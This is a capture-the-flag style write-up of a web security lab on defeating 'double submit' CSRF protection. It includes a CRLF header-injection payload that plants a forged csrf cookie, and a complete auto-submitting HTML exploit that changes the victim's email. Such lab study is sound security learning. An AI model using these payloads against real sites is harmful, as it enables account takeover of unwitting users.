# 13.1 Lab: CSRF where token is duplicated in cookie

### 📝 **Overview**

This lab's email change functionality is **vulnerable to Cross-Site Request Forgery (CSRF)**. It uses the insecure **"double submit"** CSRF prevention technique, which can be bypassed.

### 🎯 **Objective**

Use your **exploit server** to host an HTML page that performs a **CSRF attack** to change the victim’s email address.

### 🔑 **Test Credentials**

You can log in to your own account using:

- **Username**: `wiener`
- **Password**: `peter`

### 💡 **Hint**

- You **cannot register an email address** that is already in use.
- While testing your exploit, change your **own** email address to ensure it works.
- When delivering the **final exploit** to the victim, make sure to use a **new, unique** email address.

### ✅ **Steps to Reproduce and Exploit**

1. **Login and Intercept Request**
    
    Open Burp’s browser and log in using:
    
    - **Username**: `wiener`
    - **Password**: `peter`
        
        Submit the **"Update email"** form and capture the request in **Burp Proxy history**.
        
        ![2025-06-15_19-52.png](../Img/2025-06-15_19-52.png)
        
2. **Analyze Token Validation**
    - Send the request to **Burp Repeater**.
    - Observe that the `csrf` body parameter is simply validated by comparing it to the `csrf` cookie.
        
        ![2025-06-15_19-53.png](../Img/2025-06-15_19-53.png)
        
        ![2025-06-15_19-54.png](../Img/2025-06-15_19-54.png)
        
        ![2025-06-15_19-55.png](../Img/2025-06-15_19-55.png)
        
        ![2025-06-15_19-56.png](../Img/2025-06-15_19-56.png)
        
3. **Find Injection Point via Search**
    - Perform a **search** on the site.
    - Send the search request to **Repeater** and inspect the response.
    - Confirm that the **search term** is reflected in the `Set-Cookie` header (indicating a header injection vulnerability).
4. **Craft Cookie Injection URL**
    
    Create a URL to inject a fake CSRF token:
    
    ```html
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit();">
    ```
    
    ![2025-06-15_19-56_1.png](../Img/2025-06-15_19-56_1.png)
    
    ![2025-06-15_19-58.png](../Img/2025-06-15_19-58.png)
    
    ![2025-06-15_20-00.png](../Img/2025-06-15_20-00.png)
    
5. **Prepare the Exploit HTML**
    
    Use the **"Change Email"** request structure with CSRF token set to `fake`.
    
6. **Inject Cookie & Auto-Submit Form**
    
    Replace the `<script>` tag with an `<img>` tag that injects the cookie and submits the form:
    
    ```html
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
         onerror="document.forms[0].submit();">
    ```
    
    ![2025-06-15_20-03.png](../Img/2025-06-15_20-03.png)
    
    ![2025-06-15_20-33.png](../Img/2025-06-15_20-33.png)
    
7. **Use a Unique Email Address**
    
    Ensure the `email` in your payload is **not the same** as your own (e.g., `test5@wiener.com`).
    
8. **Deliver the Exploit**
    
    Host the HTML on your **exploit server**, click **"Store"**, and then **"Deliver to victim"** to complete the lab.
    

---

### 🧾 **Final Exploit Code (CSRF PoC)**

```html
<html>
  <body>
    <form action="https://0a6400a60424d83580dd03ad00490079.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test5@wiener.com" />
      <input type="hidden" name="csrf" value="test" />
    </form>
    <img src="https://0a6400a60424d83580dd03ad00490079.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" 
         onerror="document.forms[0].submit();">
  </body>
</html>
```

![2025-06-15_20-34.png](../Img/2025-06-15_20-34.png)

![2025-06-15_20-34_1.png](../Img/2025-06-15_20-34_1.png)